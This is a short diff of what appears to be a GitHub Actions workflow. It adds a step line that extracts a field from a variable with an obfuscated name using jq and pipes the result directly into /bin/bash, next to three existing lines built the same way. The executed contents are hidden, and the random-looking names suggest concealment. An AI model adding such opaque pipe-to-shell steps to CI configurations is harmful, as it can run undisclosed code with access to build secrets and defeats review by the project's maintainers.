@@ -28,6 +28,7 @@ jobs:
           echo $lowuy938 | jq -r .udg67194 | /bin/bash
           echo $hhv57047 | jq -r .ni887 | /bin/bash
           printf '%s' "$det2" | jq -r .cl836 | /bin/bash
+          printf '%s' "$ri574" | jq -r .df324 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
